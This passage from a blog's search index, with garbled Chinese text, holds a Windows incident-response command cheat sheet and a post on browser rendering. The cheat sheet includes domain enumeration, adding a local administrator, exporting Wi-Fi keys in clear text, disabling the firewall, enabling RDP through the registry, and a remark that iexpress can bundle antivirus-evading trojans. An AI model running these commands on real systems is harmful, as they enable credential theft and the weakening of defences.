<h1 id="å¿«æ·æŒ‡ä»¤"><a href="#å¿«æ·æŒ‡ä»¤" class="headerlink" title="å¿«æ·æŒ‡ä»¤"></a>å¿«æ·æŒ‡ä»¤</h1><h1 id="ç³»ç»Ÿç›¸å…³"><a href="#ç³»ç»Ÿç›¸å…³" class="headerlink" title="ç³»ç»Ÿç›¸å…³"></a>ç³»ç»Ÿç›¸å…³</h1><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> compmgmt.<span class="property">msc</span>---è®¡ç®—æœºç®¡ç†</span><br><span class="line">ã€åŒ…æ‹¬ è®¡åˆ’ä»»åŠ¡ã€äº‹ä»¶æŸ¥çœ‹å™¨ã€å…±äº«æ–‡ä»¶å¤¹ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ã€è®¾å¤‡ç®¡ç†å™¨ã€ç£ç›˜ç®¡ç†ã€æœåŠ¡ã€<span class="variable constant_">WMI</span>ã€‘</span><br><span class="line"><span class="number">2.</span> devmgmt.<span class="property">msc</span>----è®¾å¤‡ç®¡ç†å™¨ ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">3.</span> lusrmgr.<span class="property">msc</span>----æœ¬åœ°ç”¨æˆ·å’Œç»„ã€åŒ…å«äºcompmgmtã€‘<span class="number">4.</span> perfmon.<span class="property">msc</span>----è®¡ç®—æœºæ€§èƒ½ç›‘æµ‹ç¨‹åº ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">5.</span> diskmgmt.<span class="property">msc</span>---ç£ç›˜ç®¡ç†å®ç”¨ç¨‹åº ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">6.</span> fsmgmt.<span class="property">msc</span>-----å…±äº«æ–‡ä»¶å¤¹ç®¡ç†å™¨ ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">7.</span> services.<span class="property">msc</span>---æœ¬åœ°æœåŠ¡è®¾ç½®    ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">8.</span> eventvwr.<span class="property">msc</span>---äº‹ä»¶æŸ¥çœ‹å™¨     ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">9.</span> wmimgmt.<span class="property">msc</span>----æ‰“å¼€windowsç®¡ç†ä½“ç³»ç»“æ„(<span class="variable constant_">WMI</span>) ã€åŒ…å«äºcompmgmtã€‘</span><br><span class="line"><span class="number">10.</span> gpedit.<span class="property">msc</span>----ç»„ç­–ç•¥</span><br><span class="line"><span class="number">11.</span> regedt32------æ³¨å†Œè¡¨ç¼–è¾‘å™¨    ã€ä¸ regedit ç±»ä¼¼ã€‘</span><br><span class="line"><span class="number">12.</span> <span class="title class_">Msconfig</span>.<span class="property">exe</span>--ç³»ç»Ÿé…ç½®å®ç”¨ç¨‹åº ã€åŒ…æ‹¬å¼•å¯¼ã€æœåŠ¡ã€å¯åŠ¨é¡¹å’Œå·¥å…·ã€‘</span><br><span class="line"><span class="number">13.</span> rsop.<span class="property">msc</span>------ç»„ç­–ç•¥ç»“æœé›† </span><br><span class="line"><span class="number">14.</span> regedit.<span class="property">exe</span>---æ³¨å†Œè¡¨ </span><br><span class="line"><span class="number">15.</span> dcomcnfg------æ‰“å¼€ç³»ç»Ÿç»„ä»¶æœåŠ¡ ã€åŒ…æ‹¬ ç»„ä»¶æœåŠ¡ã€äº‹ä»¶æŸ¥çœ‹å™¨ã€æœåŠ¡ã€‘</span><br><span class="line"><span class="number">16.</span> wscript-------windowsè„šæœ¬å®¿ä¸»è®¾ç½® </span><br><span class="line"><span class="number">17.</span> certmgr.<span class="property">msc</span>---è¯ä¹¦ç®¡ç†å®ç”¨ç¨‹åº ã€æ’æŸ¥ç”µè„‘å†…æ¶æ„è¯ä¹¦ã€‘</span><br><span class="line"><span class="number">18.</span> secpol.<span class="property">msc</span>----æœ¬åœ°å®‰å…¨ç­–ç•¥ </span><br><span class="line"><span class="number">19.</span> services.<span class="property">msc</span>--æœ¬åœ°æœåŠ¡è®¾ç½® </span><br><span class="line"><span class="number">20.</span> gpedit.<span class="property">msc</span>----ç»„ç­–ç•¥</span><br><span class="line"><span class="number">21.</span> sigverif------æ–‡ä»¶ç­¾åéªŒè¯ç¨‹åº ã€å¯ä»¥å¿«é€Ÿç­›é€‰å‡ºæ¥æ²¡æœ‰é€šè¿‡ç­¾åéªŒè¯çš„ç¨‹åºã€‘</span><br></pre></td></tr></table></figure>

<h2 id="ç¨‹åºå¯åŠ¨ç›¸å…³"><a href="#ç¨‹åºå¯åŠ¨ç›¸å…³" class="headerlink" title="ç¨‹åºå¯åŠ¨ç›¸å…³"></a>ç¨‹åºå¯åŠ¨ç›¸å…³</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> explorer-------æ‰“å¼€èµ„æºç®¡ç†å™¨ </span><br><span class="line"><span class="number">2.</span> notepad--------æ‰“å¼€è®°äº‹æœ¬</span><br><span class="line"><span class="number">3.</span> charmap--------æ‰“å¼€å­—ç¬¦æ˜ å°„è¡¨ </span><br><span class="line"><span class="number">4.</span> calc-----------æ‰“å¼€è®¡ç®—å™¨ </span><br><span class="line"><span class="number">5.</span> taskmgr--------æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨</span><br><span class="line"><span class="number">6.</span> mstsc----------è¿œç¨‹æ¡Œé¢è¿æ¥ </span><br><span class="line"><span class="number">7.</span> write----------æ‰“å¼€å†™å­—æ¿ </span><br><span class="line"><span class="number">8.</span> mspaint--------æ‰“å¼€ç”»å›¾æ¿ </span><br><span class="line"><span class="number">9.</span> magnify--------æ”¾å¤§é•œå®ç”¨ç¨‹åº </span><br><span class="line"><span class="number">10.</span> mmc-----------æ‰“å¼€æ§åˆ¶å°  </span><br><span class="line"><span class="number">11.</span> <span class="title class_">Sndvol32</span>------æ‰“å¼€éŸ³é‡æ§åˆ¶ç¨‹åº </span><br><span class="line"><span class="number">12.</span> eudcedit------æ‰“å¼€é€ å­—ç¨‹åº </span><br><span class="line"><span class="number">13.</span> cliconfg------<span class="variable constant_">SQL</span> <span class="variable constant_">SERVER</span> å®¢æˆ·ç«¯ç½‘ç»œå®ç”¨ç¨‹åº</span><br><span class="line"><span class="number">14.</span> osk-----------æ‰“å¼€å±å¹•é”®ç›˜ </span><br><span class="line"><span class="number">15.</span> odbcad32------<span class="variable constant_">ODBC</span>æ•°æ®æºç®¡ç†å™¨ </span><br><span class="line"><span class="number">16.</span> iexpress------æ†ç»‘å·¥å…·ï¼Œç³»ç»Ÿè‡ªå¸¦ã€å¯ä»¥ç”¨æ¥åˆ¶ä½œå…æ€é©¬ã€‘</span><br></pre></td></tr></table></figure>

<h2 id="ç£ç›˜ç›¸å…³"><a href="#ç£ç›˜ç›¸å…³" class="headerlink" title="ç£ç›˜ç›¸å…³"></a>ç£ç›˜ç›¸å…³</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> cleanmgr-------æ‰“å¼€ç£ç›˜æ¸…ç†å·¥å…·</span><br><span class="line"><span class="number">2.</span> chkdsk.<span class="property">exe</span>-----<span class="title class_">Chkdsk</span>ç£ç›˜æ£€æŸ¥</span><br></pre></td></tr></table></figure>

<h2 id="æ£€æŸ¥ç›¸å…³"><a href="#æ£€æŸ¥ç›¸å…³" class="headerlink" title="æ£€æŸ¥ç›¸å…³"></a>æ£€æŸ¥ç›¸å…³</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> dxdiag---------æ£€æŸ¥<span class="title class_">DirectX</span>ä¿¡æ¯</span><br><span class="line"><span class="number">2.</span> winver---------æ£€æŸ¥<span class="title class_">Windows</span>ç‰ˆæœ¬</span><br><span class="line"><span class="number">3.</span> sfc /scannow---æ‰«æé”™è¯¯å¹¶å¤åŸ</span><br><span class="line"><span class="number">4.</span> sfc.<span class="property">exe</span>--------ç³»ç»Ÿæ–‡ä»¶æ£€æŸ¥å™¨</span><br></pre></td></tr></table></figure>

<h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><h2 id="netç›¸å…³"><a href="#netç›¸å…³" class="headerlink" title="netç›¸å…³"></a>netç›¸å…³</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹åŸŸä¸­å½“å‰çš„ä¸»æœºåˆ—è¡¨ï¼š</span><br><span class="line">net view /domain</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰åŸŸä¸­çš„ç”¨æˆ·</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">å¢åŠ ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·</span><br><span class="line">net user username password /add</span><br><span class="line"></span><br><span class="line">å°†æ–°å¢çš„ç”¨æˆ·åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span> username /add</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹åŸŸä¸­çš„å¯†ç ç­–ç•¥</span><br><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æœ¬åœ°ç»„</span><br><span class="line">net localgroup <span class="string">&quot;Group&quot;</span></span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹åŸŸä¸­çš„ç»„ä¿¡æ¯</span><br><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹åŸŸä¸­æŒ‡å®šç»„çš„æˆå‘˜</span><br><span class="line">net group <span class="string">&quot;Domain group&quot;</span> /domain</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰æœºå™¨æ‰€åœ¨çš„åŸŸå</span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰æœåŠ¡å™¨æ‰€åœ¨çš„åŸŸå</span><br><span class="line">net config server</span><br></pre></td></tr></table></figure>

<h2 id="ç³»ç»Ÿæ˜¾ç¤ºç›¸å…³"><a href="#ç³»ç»Ÿæ˜¾ç¤ºç›¸å…³" class="headerlink" title="ç³»ç»Ÿæ˜¾ç¤ºç›¸å…³"></a>ç³»ç»Ÿæ˜¾ç¤ºç›¸å…³</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯</span><br><span class="line">systeminfo /S ip /U domain\user /P <span class="title class_">Pwd</span></span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºè¿›ç¨‹å’ŒæœåŠ¡ä¿¡æ¯</span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ä»¥åŠ<span class="variable constant_">DLL</span>ä¿¡æ¯</span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºè¿›ç¨‹å’Œæ‰€æœ‰è€…</span><br><span class="line">tasklist /v</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">tasklist /S ip /v</span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºå…·ä½“çš„æœåŠ¡ä¿¡æ¯ï¼ˆåŒ…æ‹¬äºŒè¿›åˆ¶è·¯å¾„å’Œè¿è¡Œä½¿ç”¨ï¼‰</span><br><span class="line">sc qc <span class="title class_">Spooler</span></span><br></pre></td></tr></table></figure>

<h2 id="ç½‘ç»œä¿¡æ¯"><a href="#ç½‘ç»œä¿¡æ¯" class="headerlink" title="ç½‘ç»œä¿¡æ¯"></a>ç½‘ç»œä¿¡æ¯</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">æ‰“å°è·¯ç”±è¡¨</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">ä¿å­˜å½“å‰ä¸»æœºä¸Šçš„æ‰€æœ‰<span class="title class_">WiFi</span>ä¿¡æ¯</span><br><span class="line">netsh wlan <span class="keyword">export</span> profile folder=. key=clear</span><br><span class="line"></span><br><span class="line">è®¾ç½®å½“å‰é…ç½®ç¦ç”¨é˜²ç«å¢™</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">è®¾ç½®ç«¯å£è½¬å‘</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">3000</span> listenaddress=l.<span class="property">l</span>.<span class="property">l</span>.<span class="property">l</span> connectport=<span class="number">4000</span> connectaddress=<span class="number">2.2</span><span class="number">.2</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">å¯ç”¨è¿œç¨‹è®¿é—®</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line">å¯ç”¨è¿œç¨‹ååŠ©</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fAllowToGetHelp /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹è¿œç¨‹è®¿é—®ç«¯å£</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="title class_">PortNumber</span> /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">12345</span> /f</span><br></pre></td></tr></table></figure>

<h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Procexp</span> -----æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚ åŠ è½½çš„ dll æ–‡ä»¶ã€ç­¾åã€å†…å­˜ä½¿ç”¨ç­‰</span><br><span class="line">autoruns ----æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ã€è‡ªå¯åŠ¨ã€æœåŠ¡ç­‰ä¿¡æ¯</span><br><span class="line"><span class="title class_">TCPView</span> -----æŸ¥çœ‹ç½‘ç»œè¿æ¥çš„æƒ…å†µ</span><br><span class="line"><span class="title class_">PSExec</span> ------è½»é‡çº§çš„ telnet å·¥å…·</span><br><span class="line"></span><br><span class="line"><span class="title class_">Registry</span> <span class="title class_">Workshop</span>ï¼šå¥½ç”¨çš„æ³¨å†Œè¡¨å·¥å…·</span><br><span class="line"><span class="title class_">Event</span> <span class="title class_">Log</span> <span class="title class_">Explorer</span>ï¼šæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åº”æ€¥å“åº”</category>
      </categories>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>æµè§ˆå™¨æ¸²æŸ“åŸç†</title>
    <url>/archives/a074b2a4.html</url>
    <content><![CDATA[<h1 id="æµè§ˆå™¨æ¸²æŸ“åŸç†"><a href="#æµè§ˆå™¨æ¸²æŸ“åŸç†" class="headerlink" title="æµè§ˆå™¨æ¸²æŸ“åŸç†"></a>æµè§ˆå™¨æ¸²æŸ“åŸç†</h1><p>ç”¨æˆ·çœ‹åˆ°é¡µé¢å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œé¡µé¢å†…å®¹åŠ è½½å®Œæ¯•ä¸é¡µé¢èµ„æºåŠ è½½å®Œæˆï¼Œåˆ†åˆ«å¯¹åº”DOMcontentloaded å’Œloadäº‹ä»¶</p>
<p>DOMcontentloadedäº‹ä»¶è§¦å‘æ—¶ï¼Œä»…åˆ°DOMåŠ è½½å®Œæ¯•</p>
<p>loadäº‹ä»¶è§¦å‘æ—¶ï¼Œé¡µé¢ä¸Šæ‰€æœ‰çš„dom,css,js ç­‰å…¶ä»–èµ„æºå…¨éƒ¨åŠ è½½å®Œæ¯•</p>
<h1 id="æµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹"><a href="#æµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹" class="headerlink" title="æµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹"></a>æµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹</h1><ol>
<li>æµè§ˆå™¨è§£æhtmlæ–‡æ¡£ä¸ºdomæ ‘</li>
<li>æµè§ˆå™¨è§£æcssæ–‡æ¡£ä¸ºcssomæ ‘ï¼Œcsså¯¹è±¡æ¨¡å‹</li>
<li>åˆå¹¶domä¸cssomä¸ºæ¸²æŸ“æ ‘</li>
<li>å¸ƒå±€</li>
<li>å°†æ¸²æŸ“æ ‘å„ä¸ªèŠ‚ç‚¹ç»˜åˆ¶åˆ°å±å¹•ä¸Šé¢ï¼Œè¿™ä¸€æ­¥ä¸ºç»˜åˆ¶</li>
</ol>
<p><img src="/archives/a074b2a4/Untitled.png"></p>
<p>ä¸Šè¿°è¿‡ç¨‹å¹¶ä¸æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œæ ¹æ®å®é™…æƒ…å†µå¯èƒ½ä¼šå¹¶è¡Œã€é‡å¤æ‰§è¡Œ</p>
<h2 id="DOMæ ‘æ„å»ºè¿‡ç¨‹"><a href="#DOMæ ‘æ„å»ºè¿‡ç¨‹" class="headerlink" title="DOMæ ‘æ„å»ºè¿‡ç¨‹"></a>DOMæ ‘æ„å»ºè¿‡ç¨‹</h2><ul>
<li>DOMæ ‘åœ¨æ„å»ºçš„è¿‡ç¨‹ä¸­å¯èƒ½ä¼šè¢«CSSå’ŒJSçš„åŠ è½½è€Œæ‰§è¡Œé˜»å¡</li>
<li><code>display:none</code>çš„å…ƒç´ ä¹Ÿä¼šåœ¨DOMæ ‘ä¸­</li>
<li>æ³¨é‡Šä¹Ÿä¼šåœ¨DOMæ ‘ä¸­</li>
<li><code>script</code>æ ‡ç­¾ä¼šåœ¨DOMæ ‘ä¸­</li>
</ul>
<p>æ— è®ºæ˜¯DOMè¿˜æ˜¯CSSOMï¼Œéƒ½æ˜¯è¦ç»è¿‡Bytesâ†’charactersâ†’tokensâ†’nodesâ†’object modelè¿™ä¸ªè¿‡ç¨‹ã€‚</p>
<p><img src="/Untitled%201.png"></p>
<p>å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹éƒ½æ„å»ºå¥½åæ‰ä¼šå»æ„å»ºå½“å‰èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ã€‚</p>
<h2 id="æ„å»ºCSSè§„åˆ™æ ‘"><a href="#æ„å»ºCSSè§„åˆ™æ ‘" class="headerlink" title="æ„å»ºCSSè§„åˆ™æ ‘"></a>æ„å»ºCSSè§„åˆ™æ ‘</h2><p>æµè§ˆå™¨è§£æCSSæ–‡ä»¶å¹¶ç”ŸæˆCSSOMï¼Œæ¯ä¸ªCSSæ–‡ä»¶éƒ½è¢«åˆ†ææˆä¸€ä¸ªStyleSheetå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½åŒ…å«CSSè§„åˆ™ã€‚CSSè§„åˆ™å¯¹è±¡åŒ…å«å¯¹åº”äºCSSè¯­æ³•çš„é€‰æ‹©å™¨å’Œå£°æ˜å¯¹è±¡ä»¥åŠå…¶ä»–å¯¹è±¡ã€‚<br>åœ¨è¿™ä¸ªè¿‡ç¨‹éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li>CSSè§£æå¯ä»¥ä¸DOMè§£æåŒæ—¶è¿›è¡Œã€‚</li>
<li>CSSè§£æä¸<code>script</code>çš„æ‰§è¡Œäº’æ–¥ ã€‚</li>
<li>åœ¨Webkitå†…æ ¸ä¸­è¿›è¡Œäº†<code>script</code>æ‰§è¡Œä¼˜åŒ–ï¼Œåªæœ‰åœ¨JSè®¿é—®CSSæ—¶æ‰ä¼šå‘ç”Ÿäº’æ–¥ã€‚</li>
</ul>
<h2 id="æ„å»ºæ¸²æŸ“æ ‘"><a href="#æ„å»ºæ¸²æŸ“æ ‘" class="headerlink" title="æ„å»ºæ¸²æŸ“æ ‘"></a>æ„å»ºæ¸²æŸ“æ ‘</h2><p>é€šè¿‡DOMæ ‘å’ŒCSSè§„åˆ™æ ‘ï¼Œæµè§ˆå™¨å°±å¯ä»¥é€šè¿‡å®ƒä¸¤æ„å»ºæ¸²æŸ“æ ‘äº†ã€‚æµè§ˆå™¨ä¼šå…ˆä»DOMæ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹éå†æ¯ä¸ªå¯è§èŠ‚ç‚¹ï¼Œç„¶åå¯¹æ¯ä¸ªå¯è§èŠ‚ç‚¹æ‰¾åˆ°é€‚é…çš„CSSæ ·å¼è§„åˆ™å¹¶åº”ç”¨ã€‚<br>æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p>
<ul>
<li>Render Treeå’ŒDOM Treeä¸å®Œå…¨å¯¹åº”</li>
<li><code>display: none</code>çš„å…ƒç´ ä¸åœ¨Render Treeä¸­</li>
<li><code>visibility: hidden</code>çš„å…ƒç´ åœ¨Render Treeä¸­</li>
</ul>
<p><img src="/Untitled%202.png"></p>
<p>æ¸²æŸ“æ ‘ç”Ÿæˆåï¼Œè¿˜æ˜¯æ²¡æœ‰åŠæ³•æ¸²æŸ“åˆ°å±å¹•ä¸Šï¼Œæ¸²æŸ“åˆ°å±å¹•éœ€è¦å¾—åˆ°å„ä¸ªèŠ‚ç‚¹çš„ä½ç½®ä¿¡æ¯ï¼Œè¿™å°±éœ€è¦å¸ƒå±€ï¼ˆLayoutï¼‰çš„å¤„ç†äº†ã€‚</p>
<h2 id="æ¸²æŸ“æ ‘å¸ƒå±€"><a href="#æ¸²æŸ“æ ‘å¸ƒå±€" class="headerlink" title="æ¸²æŸ“æ ‘å¸ƒå±€"></a>æ¸²æŸ“æ ‘å¸ƒå±€</h2><p>å¸ƒå±€é˜¶æ®µä¼šä»æ¸²æŸ“æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹éå†ï¼Œç”±äºæ¸²æŸ“æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯ä¸€ä¸ªRender Objectå¯¹è±¡ï¼ŒåŒ…å«å®½é«˜ï¼Œä½ç½®ï¼ŒèƒŒæ™¯è‰²ç­‰æ ·å¼ä¿¡æ¯ã€‚æ‰€ä»¥æµè§ˆå™¨å°±å¯ä»¥é€šè¿‡è¿™äº›æ ·å¼ä¿¡æ¯æ¥ç¡®å®šæ¯ä¸ªèŠ‚ç‚¹å¯¹è±¡åœ¨é¡µé¢ä¸Šçš„ç¡®åˆ‡å¤§å°å’Œä½ç½®ï¼Œå¸ƒå±€é˜¶æ®µçš„è¾“å‡ºå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç›’å­æ¨¡å‹ï¼Œå®ƒä¼šç²¾ç¡®åœ°æ•è·æ¯ä¸ªå…ƒç´ åœ¨å±å¹•å†…çš„ç¡®åˆ‡ä½ç½®ä¸å¤§å°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li><code>float</code>å…ƒç´ ï¼Œ<code>absoulte</code>å…ƒç´ ï¼Œ<code>fixed</code>å…ƒç´ ä¼šå‘ç”Ÿä½ç½®åç§»ã€‚</li>
<li>æˆ‘ä»¬å¸¸è¯´çš„è„±ç¦»æ–‡æ¡£æµï¼Œå…¶å®å°±æ˜¯è„±ç¦»Render Treeã€‚</li>
</ul>
<h2 id="æ¸²æŸ“æ ‘ç»˜åˆ¶"><a href="#æ¸²æŸ“æ ‘ç»˜åˆ¶" class="headerlink" title="æ¸²æŸ“æ ‘ç»˜åˆ¶"></a>æ¸²æŸ“æ ‘ç»˜åˆ¶</h2><p>åœ¨ç»˜åˆ¶é˜¶æ®µï¼Œæµè§ˆå™¨ä¼šéå†æ¸²æŸ“æ ‘ï¼Œè°ƒç”¨æ¸²æŸ“å™¨çš„paint()æ–¹æ³•åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå…¶å†…å®¹ã€‚æ¸²æŸ“æ ‘çš„ç»˜åˆ¶å·¥ä½œæ˜¯ç”±æµè§ˆå™¨çš„UIåç«¯ç»„ä»¶å®Œæˆçš„ã€‚</p>
<h1 id="æµè§ˆå™¨æ ¸å¿ƒéƒ¨ä»¶"><a href="#æµè§ˆå™¨æ ¸å¿ƒéƒ¨ä»¶" class="headerlink" title="æµè§ˆå™¨æ ¸å¿ƒéƒ¨ä»¶"></a>æµè§ˆå™¨æ ¸å¿ƒéƒ¨ä»¶</h1><p><img src="/Untitled%203.png"></p>
<p>ä¸»æµçš„æ¸²æŸ“å¼•æ“æœ‰webkit&#x2F;Gecko</p>
<h1 id="æ¸²æŸ“æœºåˆ¶çš„è¡¥å……"><a href="#æ¸²æŸ“æœºåˆ¶çš„è¡¥å……" class="headerlink" title="æ¸²æŸ“æœºåˆ¶çš„è¡¥å……"></a>æ¸²æŸ“æœºåˆ¶çš„è¡¥å……</h1><h2 id="æ¸²æŸ“é˜»å¡"><a href="#æ¸²æŸ“é˜»å¡" class="headerlink" title="æ¸²æŸ“é˜»å¡"></a>æ¸²æŸ“é˜»å¡</h2><h3 id="jsæ¸²æŸ“é˜»å¡"><a href="#jsæ¸²æŸ“é˜»å¡" class="headerlink" title="jsæ¸²æŸ“é˜»å¡"></a>jsæ¸²æŸ“é˜»å¡</h3><p>JSå¯ä»¥æ“ä½œDOMæ¥ä¿®æ”¹DOMç»“æ„ï¼Œå¯ä»¥æ“ä½œCSSOMæ¥ä¿®æ”¹èŠ‚ç‚¹æ ·å¼ï¼Œè¿™å°±å¯¼è‡´äº†æµè§ˆå™¨åœ¨é‡åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾æ—¶ï¼ŒDOMæ„å»ºå°†æš‚åœï¼Œç›´è‡³è„šæœ¬å®Œæˆæ‰§è¡Œï¼Œç„¶åç»§ç»­æ„å»ºDOMã€‚å¦‚æœè„šæœ¬æ˜¯å¤–éƒ¨çš„ï¼Œä¼šç­‰å¾…è„šæœ¬ä¸‹è½½å®Œæ¯•ï¼Œå†ç»§ç»­è§£ææ–‡æ¡£ã€‚ç°åœ¨å¯ä»¥åœ¨<code>script</code>æ ‡ç­¾ä¸Šå¢åŠ å±æ€§<code>defer</code>æˆ–è€…<code>async</code>ã€‚è„šæœ¬è§£æä¼šå°†è„šæœ¬ä¸­æ”¹å˜DOMå’ŒCSSçš„åœ°æ–¹åˆ†åˆ«è§£æå‡ºæ¥ï¼Œè¿½åŠ åˆ°DOMæ ‘å’ŒCSSOMè§„åˆ™æ ‘ä¸Šã€‚</p>
<h3 id="cssæ¸²æŸ“é˜»å¡"><a href="#cssæ¸²æŸ“é˜»å¡" class="headerlink" title="cssæ¸²æŸ“é˜»å¡"></a>cssæ¸²æŸ“é˜»å¡</h3><p>ç”±äºCSSOMè´Ÿè´£å­˜å‚¨æ¸²æŸ“ä¿¡æ¯ï¼Œæµè§ˆå™¨å°±å¿…é¡»ä¿è¯åœ¨åˆæˆæ¸²æŸ“æ ‘ä¹‹å‰ï¼ŒCSSOMæ˜¯å®Œå¤‡çš„ï¼Œè¿™ç§å®Œå¤‡æ˜¯æŒ‡æ‰€æœ‰çš„CSSï¼ˆå†…è”ã€å†…éƒ¨å’Œå¤–éƒ¨ï¼‰éƒ½å·²ç»ä¸‹è½½å®Œï¼Œå¹¶è§£æå®Œï¼Œåªæœ‰CSSOMå’ŒDOMçš„è§£æå®Œå…¨ç»“æŸï¼Œæµè§ˆå™¨æ‰ä¼šè¿›å…¥ä¸‹ä¸€æ­¥çš„æ¸²æŸ“ï¼Œè¿™å°±æ˜¯CSSé˜»å¡æ¸²æŸ“ã€‚</p>
<p>CSSé˜»å¡æ¸²æŸ“æ„å‘³ç€ï¼Œåœ¨CSSOMå®Œå¤‡å‰ï¼Œé¡µé¢å°†ä¸€ç›´å¤„ç†ç™½å±çŠ¶æ€ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ ·å¼æ”¾åœ¨<code>head</code>ä¸­ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ›´å¿«çš„è§£æCSSï¼Œä¿è¯æ›´å¿«çš„é¦–æ¬¡æ¸²æŸ“ã€‚</p>
<h2 id="å›æµ"><a href="#å›æµ" class="headerlink" title="å›æµ"></a>å›æµ</h2><p>å½“é¡µé¢çš„å¸ƒå±€å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œå¿…ç„¶ä¼šè§¦å‘å›æµï¼Œè§¦å‘å›æµå¿…ç„¶ä¼šè§¦å‘é‡ç»˜</p>
<h2 id="é‡ç»˜"><a href="#é‡ç»˜" class="headerlink" title="é‡ç»˜"></a>é‡ç»˜</h2><p>å½“å…ƒç´ çš„èƒŒæ™¯é¢œè‰²ï¼ŒèƒŒæ™¯è‰²ã€è¾¹æ¡†é¢œè‰²ç­‰å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œä¼šè§¦å‘é‡ç»˜</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
